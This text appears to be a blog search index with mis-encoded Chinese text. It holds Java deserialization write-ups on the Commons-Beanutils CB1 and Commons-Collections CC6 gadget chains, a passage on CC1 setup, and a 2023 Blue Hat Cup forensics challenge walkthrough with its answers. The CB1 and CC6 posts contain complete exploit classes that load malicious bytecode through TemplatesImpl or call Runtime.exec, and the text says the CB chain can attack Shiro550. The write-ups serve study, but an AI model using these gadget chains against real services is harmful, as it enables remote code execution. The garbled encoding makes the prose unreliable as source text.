&lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;2&gt; ä»€ä¹ˆæ˜¯CommonsBeanutilså’ŒJavaBeanï¼ŸCommonsBeanutils æ˜¯åº”ç”¨äº javabean çš„å·¥å…·ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€šJavaç±»å¯¹è±¡ï¼ˆä¹Ÿç§°ä¸ºJavaBeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³• é‚£ ä»€ä¹ˆæ˜¯JavaBeanå‘¢ï¼Ÿ JavaBean æ˜¯ä¸€ç§JAVAè¯­è¨€å†™æˆçš„å¯é‡ç”¨ç»„ä»¶,å®ƒæ˜¯ä¸€ä¸ªç±» æ‰€è°“javaBeanï¼Œæ˜¯æŒ‡ç¬¦åˆå¦‚ä¸‹æ ‡å‡†çš„Javaç±»ï¼š ç±»æ˜¯å…¬å…±çš„ æœ‰ä¸€ä¸ªæ— å‚çš„å…¬å…±çš„æ„é€ å™¨ æœ‰ç§æœ‰å±æ€§ï¼Œä¸”é¡»æœ‰å¯¹åº”çš„getã€setæ–¹æ³•å»è®¾ç½®å±æ€§ å¯¹äºbooleanç±»å‹çš„æˆå‘˜å˜é‡ï¼Œå…è®¸ä½¿ç”¨â€isâ€ä»£æ›¿ä¸Šé¢çš„â€getâ€å’Œâ€setâ€ åœ¨javaä¸­ï¼Œæœ‰å¾ˆå¤šç±»å®šä¹‰éƒ½ç¬¦åˆè¿™æ ·çš„è§„èŒƒ æ¯”å¦‚è¿™æ ·ä¸€ä¸ªç±» 12345678910111213public class Person { private String name; // å±æ€§ä¸€èˆ¬å®šä¹‰ä¸ºprivate public Person(String name) { this.name = name; } public String getName() { //è¯»æ–¹æ³• return name; } public void setName(String n) { //å†™æ–¹æ³• name = n; }} å®ƒåŒ…å«äº†ä¸€ä¸ªç§æœ‰å±æ€§nameï¼Œä»¥åŠè¯»å–å’Œè®¾ç½®è¿™ä¸ªå±æ€§çš„ä¸¤ä¸ªpublicæ–¹æ³• getName()å’ŒsetName()ï¼Œå³getterå’Œsetter è¿™ç§ class å°±æ˜¯ JavaBean ç”¨äºå¯¹å±æ€§èµ‹å€¼çš„æ–¹æ³•ç§°ä¸ºå±æ€§ä¿®æ”¹å™¨æˆ–setteræ–¹æ³•ï¼Œç”¨äºè¯»å–å±æ€§å€¼çš„æ–¹æ³•ç§°ä¸ºå±æ€§è®¿é—®å™¨æˆ–getteræ–¹æ³• åªæœ‰getterçš„å±æ€§ç§°ä¸ºåªè¯»å±æ€§ï¼ˆread-onlyï¼‰ï¼Œä¾‹å¦‚ï¼Œå®šä¹‰ä¸€ä¸ªageåªè¯»å±æ€§ï¼š å¯¹åº”çš„è¯»æ–¹æ³•æ˜¯int getAge() æ— å¯¹åº”çš„å†™æ–¹æ³•setAge(int) ç±»ä¼¼çš„ï¼Œåªæœ‰setterçš„å±æ€§ç§°ä¸ºåªå†™å±æ€§ï¼ˆwrite-onlyï¼‰ æ³¨ï¼šå±æ€§åªéœ€è¦å®šä¹‰getterå’Œsetteræ–¹æ³•ï¼Œä¸ä¸€å®šéœ€è¦å¯¹åº”çš„å­—æ®µï¼Œä¾‹å¦‚ï¼Œchildåªè¯»å±æ€§å®šä¹‰å¦‚ä¸‹ï¼š 1234567891011121314public class Person { private String name; private int age; public String getName() { return this.name; } public void setName(String name) { this.name = name; } public int getAge() { return this.age; } public void setAge(int age) { this.age = age; } public boolean isChild() { return age &lt;= 6; }} &lt;3&gt; CommonsBeanutilsåˆ©ç”¨ç‚¹commons-beanutilsä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•PropertyUtils.getProperty()ï¼Œå¯ä»¥è®©ä½¿ç”¨è€…ç›´æ¥è°ƒç”¨ä»»æ„JavaBeançš„getteræ–¹æ³• PropertyUtils.getProperty()ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸º JavaBean å®ä¾‹ï¼Œç¬¬äºŒä¸ªæ˜¯ JavaBean çš„å±æ€§ æ¯”å¦‚ï¼š 12345Person person = new Person(&quot;Mike&quot;);PropertyUtils.getProperty(person,&quot;name&quot;);# ç­‰ä»·äºPerson person = new Person(&quot;Mike&quot;);person.getName(); é™¤æ­¤ä¹‹å¤–ï¼Œ PropertyUtils.getProperty è¿˜æ”¯æŒé€’å½’è·å–å±æ€§ï¼Œæ¯”å¦‚aå¯¹è±¡ä¸­æœ‰å±æ€§bï¼Œbå¯¹è±¡ä¸­æœ‰å±æ€§cï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ PropertyUtils.getProperty(a, â€œb.câ€); çš„æ–¹å¼è¿›è¡Œé€’å½’è·å–ã€‚é€šè¿‡è¿™ä¸ªæ–¹æ³•ï¼Œä½¿ç”¨è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒç”¨ä»»æ„å¯¹è±¡çš„getter å› æ­¤ï¼Œå¦‚æœgetteræ–¹æ³•å­˜åœ¨å¯ä»¥rceçš„ç‚¹å¯ä»¥åˆ©ç”¨çš„è¯ï¼Œå°±å­˜åœ¨å®‰å…¨é—®é¢˜äº†ã€‚ commons-beanutilsé‡Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„è¾…åŠ©æ–¹æ³•ï¼Œsetterç­‰ç­‰ï¼Œè¿™é‡Œåˆ†æCBé“¾æš‚æ—¶ç”¨ä¸åˆ° ä¸å†å™è¿° &lt;4&gt; åˆ©ç”¨é“¾åˆ†æåœ¨å‰é¢çš„CCé“¾ä¸­ï¼Œæˆ‘ä»¬æåˆ°è¿‡ä¸€ç§åˆ©ç”¨ TemplatesImpl åŠ¨æ€åŠ è½½æ¶æ„ç±»æ¥å®ç°rce å®ƒçš„é“¾å­ä¸ºï¼š 1234567/*TemplatesImpl#getOutputProperties() TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass()*/ é‡ç‚¹çœ‹ï¼šTemplatesImpl#getOutputProperties() getOutputProperties()æ–¹æ³•å³å…¶ _outputProperties å±æ€§çš„ getter æ–¹æ³•æ˜¯åŠ è½½æ¶æ„å­—èŠ‚ç çš„èµ·ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ å‰é¢æåˆ°çš„ï¼Œcommons-beanutilsé‡Œçš„PropertyUtils.getProperty()å»è°ƒç”¨getter é‚£ä¹ˆå¾€ä¸Šæ‰¾é“¾å­ï¼ŒCBé“¾é‡Œ å“ªä¸ªä½ç½®è°ƒç”¨äº†getPropertyå‘¢ï¼Ÿ åœ¨ä¹‹å‰çš„CC2/4çš„é“¾ä¸­æˆ‘ä»¬ç”¨åˆ°äº†java.util.PriorityQueueçš„readObjectè§¦å‘ååºåˆ—åŒ–ï¼Œä¸»è¦æ˜¯é€šè¿‡è°ƒç”¨äº†å…¶TransformingComparatorçš„compareæ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨äº†transformé“¾çš„è°ƒç”¨ è€Œ CommonsBeanutils åˆ©ç”¨é“¾ä¸­æ ¸å¿ƒçš„è§¦å‘ä½ç½®å°±æ˜¯ BeanComparator.compare() å‡½æ•°ï¼Œå½“è°ƒç”¨ BeanComparator.compare() å‡½æ•°æ—¶ï¼Œå…¶å†…éƒ¨ä¼šè°ƒç”¨æˆ‘ä»¬å‰é¢è¯´çš„ getProperty å‡½æ•°ï¼Œè¿›è€Œè°ƒç”¨ JavaBean ä¸­å¯¹åº”å±æ€§çš„ getter å‡½æ•° è¿™é‡Œä¼šè°ƒç”¨PropertyUtils.getProperty()æ–¹æ³• å› æ­¤é€šè¿‡ç»™ o1èµ‹å€¼æ„é€ å¥½çš„templateså¯¹è±¡ï¼Œpropertyèµ‹å€¼ä¸ºTemplatesImplçš„ outputPropertieså±æ€§ï¼Œå³å¯è°ƒç”¨ TemplatesImpl.getOutputProperties() å¾€ä¸‹å°±æ˜¯TemplatesImplçš„åˆ©ç”¨é“¾ é‚£ä¹ˆå¾€ä¸Šæ‰¾ å“ªé‡Œè°ƒç”¨ compare()å‘¢ å¯ä»¥åˆ©ç”¨CC2/4é“¾ä¸­ç”¨çš„ PriorityQueue.readObject() å› æ­¤æ•´ä½“çš„CBé“¾å°±æ˜¯ 12345678PriorityQueue.readObject() -&gt; BeanComparator.compare() -&gt; PropertyUtils.getProperty() -&gt; TemplatesImpl.getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; ................ -&gt; TransletClassLoader.defineClass() -&gt; Evil.newInstance() å‰é¢çš„CC2æ–‡ç« æåˆ°äº†ï¼Œqueueçš„sizeåº”è¯¥&gt;2ã€‚ è€Œadd()ä¹Ÿä¼šæ‰§è¡Œcompareç”±äºåœ¨BeanComparator#compare() ä¸­ï¼Œå¦‚æœ this.property ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡ã€‚è¿™é‡Œå®é™…ä¸Šå°±æ˜¯å¯¹1ã€2è¿›è¡Œæ’åºã€‚ 1234BeanComparator comparator = new BeanComparator();PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);queue.add(1);queue.add(2); åˆå§‹åŒ–æ—¶ä½¿ç”¨æ­£ç»å¯¹è±¡ï¼Œä¸” property ä¸ºç©ºï¼Œè¿™ä¸€ç³»åˆ—æ“ä½œæ˜¯ä¸ºäº†åˆå§‹åŒ–çš„æ—¶å€™ä¸è¦å‡ºé”™ã€‚ç„¶åï¼Œæˆ‘ä»¬å†ç”¨åå°„å°† property çš„å€¼è®¾ç½®æˆæ¶æ„çš„ outputProperties ï¼Œå°†addè¿›é˜Ÿåˆ—é‡Œçš„1ã€2æ›¿æ¢æˆæ¶æ„çš„TemplateImpl å¯¹è±¡ 1setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;); ä¸CC2/4 ç•¥å¾®ä¸åŒçš„æ˜¯ï¼Œè¿˜éœ€è¦ç”¨åå°„å»ä¿®æ”¹ queueå±æ€§çš„å€¼ï¼Œå› ä¸ºè¦æ§åˆ¶ BeanComparator.compare()çš„å‚æ•°ä¸ºæ¶æ„templateså¯¹è±¡ 1setFieldValue(queue,&quot;queue&quot;,new Object[]{templates,templates});// è®¾ç½®BeanComparator.compare()çš„å‚æ•° EXPå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CB1 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;1vxyz&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;evil.classè·¯å¾„&quot;)); byte[][] codes = {code}; setFieldValue(templates, &quot;_bytecodes&quot;, codes); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); BeanComparator comparator = new BeanComparator(); PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); queue.add(1); queue.add(2); setFieldValue(queue,&quot;queue&quot;,new Object[]{templates,templates});// è®¾ç½®BeanComparator.compare()çš„å‚æ•° setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;); serialize(queue); unserialize(&quot;CB-bin/CB1.bin&quot;); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;CB-bin/CB1.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }} shiro550ä¸­è‡ªå¸¦CommonsBeanutils 1.8.3 å’Œ commons-collections-3.2.1çš„ä¾èµ–ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ¡é“¾è¿›è¡Œæ”»å‡»","link":"/2023/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Beanutils%E7%AF%87-CB%E9%93%BE/"},{"title":"2023è“å¸½æ¯åŠå†³èµ›ç”µå­å–è¯","text":"å‰è¨€åˆèµ›å–è¯æ²¡æœ‰å¤ç°å®Œï¼Œæœ¬æ¥ä»¥ä¸ºæˆç»©ä¼šå¾ˆä½ï¼Œä½†æ˜¯æ¯”èµ›å–è¯è€ƒå¯Ÿæ‰‹æœºå’Œapkå–è¯ï¼ŒèŒƒå›´å°ä¸€äº› åˆšå¥½èµ›å‰åœ¨çªå‡»è¿™äº›æ–¹é¢ï¼Œæœ€ç»ˆå–è¯ä¹Ÿæ²¡æ‹‰åˆ† åè€Œè¿˜æåˆ†äº†å“ˆå“ˆ è®°å½•ä¸€ä¸‹ webé¢˜ç›®è€ƒç‚¹ â€¦ æ„Ÿè§‰æ²¡æœ‰ä»€ä¹ˆå­¦ä¹ çš„æ„ä¹‰ ä¸å†™äº† è®°å½•ä¸€ä¸‹è¿™æ¬¡å–è¯ [TOC] å–è¯å–è¯æ¡ˆæƒ…ä»‹ç»ï¼š2023å¹´åˆï¼ŒæŸåœ°å…¬å®‰æœºå…³æŠ“è·ä¸€ä¸ªç½‘ç»œè¯ˆéª—æŠ€æœ¯å«Œç–‘äººï¼Œå…¬å®‰æœºå…³åœ¨æ‰£æŠ¼å«Œç–‘äººåï¼Œå¯¹å«Œç–‘äººæ‰‹æœºè¿›è¡Œæ•°æ®æå–ï¼Œåœ¨æå–å®Œæˆåˆ†æå‘ç°å«Œç–‘äººå°†é€šè¯è®°å½•åŠçŸ­ä¿¡è®°å½•è¿›è¡Œäº†åˆ é™¤ï¼Œæ ¹æ®å«Œç–‘äººäº¤ä»£ï¼Œå…¶åœ¨åˆ é™¤é€šè¯åŠçŸ­ä¿¡è®°å½•å‰ä½¿ç”¨è¿‡åŒä¼™ç¼–å†™çš„æµ‹è¯•è½¯ä»¶ï¼Œè¯¥å®‰å“ç¨‹åºä¼šè¯»å–é€šè¯åŠçŸ­ä¿¡è®°å½•å¹¶å­˜æ”¾åˆ°æ‰‹æœºä¸­ã€‚ç”±äºé€šè¯å’ŒçŸ­ä¿¡è®°å½•å¯¹æ¡ˆä»¶å¾ˆé‡è¦ï¼Œè¯·å‚èµ›é˜Ÿå‘˜åˆ†ææ‰‹æœºé•œåƒåŠå¯¹åº”apkï¼Œå®Œæˆå–è¯é¢˜ç›® 1. æ£€ææ•°æ®å¼€å§‹æå–æ˜¯ä»Šå¹´ä»€ä¹ˆæ—¶å€™ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š04-12 13:26ï¼‰æ³¨æ„æ˜¯å¼€å§‹æå–çš„æ—¶é—´ logæ–‡ä»¶é‡Œæ‰¾ä»»åŠ¡å¼€å§‹æ—¶é—´å³å¯ ç­”æ¡ˆï¼š09-11 17:21 2. å«Œç–‘äººæ‰‹æœºSDå¡å­˜å‚¨ç©ºé—´ä¸€å…±å¤šå°‘GBï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š 22.5ï¼‰æ¯”èµ›ç”³è¯·çš„æ‰‹æœºå–è¯è½¯ä»¶æ‰“å¼€å³å¯ ç¼–è¾‘ ç­”æ¡ˆï¼š24.32 3. å«Œç–‘äººæ‰‹æœºè®¾å¤‡åç§°æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šadferï¼‰ç­”æ¡ˆï¼šsailfish 4. å«Œç–‘äººæ‰‹æœºIMEIæ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š3843487568726387ï¼‰ç¼–è¾‘ ç­”æ¡ˆï¼š352531082716257 5. å«Œç–‘äººæ‰‹æœºé€šè®¯å½•æ•°æ®å­˜æ”¾åœ¨é‚£ä¸ªæ•°æ®åº“æ–‡ä»¶ä¸­ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šcall.dbï¼‰ç¼–è¾‘ ç­”æ¡ˆï¼šcontacts.db 6. å«Œç–‘äººæ‰‹æœºä¸€å…±ä½¿ç”¨è¿‡å¤šå°‘ä¸ªåº”ç”¨ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š22ï¼‰è¿™ä¸ªåšé”™äº†ï¼Œæ‰‹æœºä¸Šä¸€å…±æœ‰205ä¸ªè½¯ä»¶ï¼Œåˆ è¿‡ä¸€ä¸ª åº”ç”¨æ—¥å¿—æœ‰205ä¸ª æ‰€ä»¥ç›´æ¥å¡«äº† åº”è¯¥æ˜¯è¦ä»”ç»†çœ‹å…·ä½“ç”¨è¿‡å“ªäº›ä¸ªçš„ ç­”æ¡ˆï¼šï¼Ÿ 7. æµ‹è¯•apkçš„åŒ…åæ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šcon.tencent.comï¼‰æå–å‡ºæ¥æµ‹è¯•æ–‡ä»¶çš„apk Android killer æ‰“å¼€ ç¼–è¾‘ ç­”æ¡ˆï¼šcom.example.myapplication 8. æµ‹è¯•apkçš„ç­¾åç®—æ³•æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼:AES250ï¼‰jadxåç¼–è¯‘ä¸€ä¸‹apkï¼Œåœ¨ APK signatureå¯ä»¥çœ‹åˆ° ç¼–è¾‘ ç­”æ¡ˆï¼šSHA256withRSA 9. æµ‹è¯•apkçš„ä¸»å…¥å£æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šcom.tmp.mainactivityï¼‰android killeræ‰“å¼€å³å¯çœ‹åˆ° ç¼–è¾‘ ç­”æ¡ˆï¼šcom.example.myapplication.MainActivity 10. æµ‹è¯•apkä¸€å…±ç”³è¯·äº†å‡ ä¸ªæƒé™ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š7ï¼‰ç¼–è¾‘ ç­”æ¡ˆï¼š3 11. æµ‹è¯•apkå¯¹Calllog.txtæ–‡ä»¶å†…çš„æ•°æ®è¿›è¡Œäº†ä»€ä¹ˆåŠ å¯†ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šDESï¼‰è¿™é“é¢˜é”™äº† ä¸çŸ¥é“ä¸ºä»€ä¹ˆ æ ¼å¼é—®é¢˜ï¼Ÿ ä¸è¿‡åº”è¯¥å°±æ˜¯base64åŠ å¯† ç¼–è¾‘ ç¼–è¾‘ ç­”æ¡ˆï¼šï¼Ÿ 12. 10086å¯¹å«Œç–‘äººæ‹¨æ‰“è¿‡å‡ æ¬¡ç”µè¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š5ï¼‰ä»ç¬¬11å¯çŸ¥ calllog.txt æ˜¯è¿›è¡Œäº†base64åŠ å¯†çš„ï¼Œæ‰¾åˆ°calllog.txt base64è§£å¯†å³å¯å¾—åˆ°é€šè¯è®°å½• ç¼–è¾‘ ç­”æ¡ˆï¼š2 13. æµ‹è¯•apkå¯¹çŸ­ä¿¡è®°å½•è¿›è¡Œäº†å‡ æ¬¡åŠ å¯†ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š5ï¼‰å…ˆAES å base64 ä¸¤æ¬¡åŠ å¯† ç¼–è¾‘ ç­”æ¡ˆï¼š2 14. æµ‹è¯•apkå¯¹çŸ­ä¿¡è®°å½•è¿›è¡ŒåŠ å¯†çš„ç§˜é’¥æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šslkdjlfslskdnlnï¼‰è·Ÿè¿› encryptData()é‡Œçš„key String key = Getkey(); è·Ÿåˆ°äº† public native String Getkey(); é—®äº†é—®äºŒè¿›åˆ¶æ‰‹ éœ€è¦å»é€†ä¸€ä¸‹ .soæ–‡ä»¶é‡Œ å‡½æ•°é€»è¾‘ æ¥å¾—åˆ°å¯†é’¥ äº¤ç»™é€†å‘äº†ç›´æ¥ æ±‚å‡ºæ¥ä¹‹åè§£15é¢˜èƒ½è§£å‡ºæ¥ï¼Œä¹Ÿå¯ä»¥å˜å‘è¯æ˜è¿™é“é¢˜é€†å¯¹äº† ç­”æ¡ˆï¼šbGlqdWJkeWhmdXJp 15. å«Œç–‘äººåœ¨2021å¹´ç™»å½•æ”¯ä»˜å®çš„éªŒè¯ç æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š3464ï¼‰æ ¹æ®ç¬¬ 13 14é¢˜ï¼Œå¯çŸ¥SMS.txtçš„åŠ å¯†é€»è¾‘å’Œå¯†é’¥ï¼Œç”¨å¯†é’¥ AESè§£å¯†å³å¯è¿˜åŸçŸ­ä¿¡å†…å®¹ ç¼–è¾‘ ç­”æ¡ˆï¼š9250","link":"/2023/09/20/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"},{"title":"Javaååºåˆ—åŒ–Commons-Collectionç¯‡02-CC6é“¾","text":"&lt;1&gt;ç¯å¢ƒåˆ†æå®é™…ä¸Š CC6é“¾å­ åˆæ˜¯CC1çš„ä¸€ä¸ªå˜ç§ æ²¡æœ‰ç‰ˆæœ¬é™åˆ¶æ‰¾åˆ°è¿™ä¸ªæ¼æ´çš„äººåˆå¼€è¾Ÿå‡º ä¸€ä¸ªæ–°çš„çº¿è·¯ é€šè¿‡ TiedMapEntry.hashcode() å»è§¦å‘ CC1é‡Œçš„ LazyMap.get() è¿™é‡Œæˆ‘ä»¬æ˜¯ç»§ç»­æ²¿ç”¨çš„CC1 çš„é¡¹ç›®jdkç‰ˆæœ¬ï¼šjdk8u65pom.xmlå†…å®¹ï¼š 12345678&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; &lt;2&gt; é“¾å­åˆ†æ12345678910111213/* Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() é¦–å…ˆ LazyMap().get()-&gt;InvokerTransformer.transform() è¿™æ®µä»£ç æ˜¯ä¸å˜çš„ æˆ‘ä»¬é€šè¿‡ TiedMapEntryçš„hashcodeæ–¹æ³• TiedMapEntry.hashcode()é‡Œ ä¼šæ‰§è¡Œ getValue()å†æ¥çœ‹ä¸€ä¸‹getValue()æ–¹æ³• è¿™é‡Œä¼š returnä¸€ä¸ª map.get() å¦‚æœæˆ‘ä»¬æŠŠmapæ„é€ æˆä¸Šé¢çš„ LazyMap é‚£ä¸å°±å®ç°äº† LazyMap.get()??? HashMap.put() å»è§¦å‘ TiedMapEntry() ä½†æ˜¯è¿™é‡Œå’Œæˆ‘ä»¬åœ¨ä¸Šé¢å­¦ä¹ URLDNSé“¾å·®ä¸å¤šï¼Œä¹Ÿæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ æ¯”å¦‚æˆ‘ä»¬åœ¨URLDNSé“¾å­çš„æ—¶å€™ï¼Œåœ¨Hashmap.put()çš„æ—¶å€™ï¼ŒhashMapç±»å°±è°ƒç”¨äº†hashæ–¹æ³•,å¹¶ä¸”åœ¨URLStreamHandleræŠ½è±¡ç±»çš„hashCode()å‡½æ•°ä¸­åˆ¤æ–­URLStreamHandlerçš„hashcodeå±æ€§å€¼ã€‚ä¸ä¸ºåˆå§‹åŒ–çš„å€¼(-1)æ—¶ä¼šç›´æ¥è¿”å›,ç”±äºåœ¨åºåˆ—åŒ–çš„æ—¶å€™å·²ç»è¿›è¡Œäº†hashCodeè®¡ç®—,æ‰€ä»¥åœ¨ ååºåˆ—åŒ–æ—¶ hashcodeå±æ€§å€¼ä¸ä¸º-1 å°±ä¸ä¼šå‘ä¸‹è¿›è¡Œ URL.hashcode() å› æ­¤å®é™…ä¸Šæˆ‘ä»¬æ”¶åˆ°çš„DNSè¯·æ±‚æ˜¯åœ¨putçš„æ—¶å€™æ‰§è¡Œçš„ï¼Œè€Œä¸æ˜¯ååºåˆ—åŒ–æ‰§è¡Œçš„ èƒŒç¦»äº†æˆ‘ä»¬æœ¬æ„ ç„¶è€ŒCC6çš„è¯ï¼Œæ˜¯é€šè¿‡HashMap.put() -&gt; TiedMapEntry.hashCode() -&gt; LazyMap.get() æˆ‘ä»¬çœ‹ä¸€ä¸‹LazyMap çš„ get æ–¹æ³• å®ƒä¼šåˆ¤æ–­keyæ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨çš„è¯ï¼Œæ‰ä¼šå»æ‰§è¡Œ factory.transform() å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œå°†LazyMapå¯¹è±¡é‡Œçš„é‚£ä¸ªmapçš„keyç½®ç©ºã€‚ å› ä¸ºåœ¨putçš„æ—¶å€™ï¼Œé“¾å­ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œä¸ºäº†ä¸å½±å“ æˆ‘ä»¬å…ˆä¸ç»™factoryèµ‹å€¼æ„é€ çš„transformersï¼Œéšä¾¿èµ‹å€¼ä¸€ä¸ªæ²¡ç”¨çš„factoryâ€“new ConstantTransformer(1)ã€‚ åˆæ˜¯å› ä¸ºfactoryç±»å‹æ˜¯protected final Transformer factory åé¢åœ¨åºåˆ—åŒ–å‰æˆ‘ä»¬éœ€è¦åˆ©ç”¨åå°„ æ”¹å›æ¥ pocå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041public class CC6Test { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;aaa&quot;); HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(tiedMapEntry,&quot;bbb&quot;); //æœ¬åœ°æ‰§è¡Œputæ—¶ï¼Œä¼šè°ƒç”¨ tiedmapTntry.hashcode lazyMap.get(&quot;aaa&quot;) ä¼šè®©lazyMap keyä¸ä¸ºflase lazyMap.remove(&quot;aaa&quot;); //removeæ‰putæ—¶ lazyMapé‡Œçš„key ä½¿ååºåˆ—åŒ–æ—¶èƒ½è¿›å…¥transform Class c = LazyMap.class; Field factory = c.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(lazyMap,chainedTransformer); //åå°„ä¿®æ”¹lazyMapé‡Œçš„factory //serialize(map2); unserialize(&quot;sercc6.bin&quot;); } public static void serialize(Object o) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc6.bin&quot;)); oos.writeObject(o); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }}","link":"/2023/06/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collection%E7%AF%8702-CC6%E9%93%BE/"},{"title":"Javaååºåˆ—åŒ–Commons-Collectionç¯‡01-CC1é“¾","text":"&lt;1&gt; ç¯å¢ƒé…ç½®å› ä¸ºCC1é“¾åœ¨jdk 8u71åå°±ä¿®å¤äº† å› æ­¤æˆ‘ä»¬å¤ç°å°±åˆ©ç”¨ 8u65çš„ç‰ˆæœ¬ å»å®˜ç½‘ä¸‹è½½ jdk8u65https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html ç„¶åå» ä¸‹è½½openjdkhttp://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/af660750b2f4/æŠŠä¸‹è½½çš„openjdké‡Œ /share/classes/ é‡Œé¢çš„ sunåŒ… å¤åˆ¶åˆ° jdk1.8.0_65é‡Œ æ‰“å¼€IDEA æ–°å»ºä¸€ä¸ªMavené¡¹ç›® é€‰æ‹© org.apache.maven.archetypes:maven-archetype-webapp å¯¼å…¥commons collections mavenä¾èµ– å°†ä¸‹é¢å†™å…¥åˆ° pom.xml é‡Œ 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; 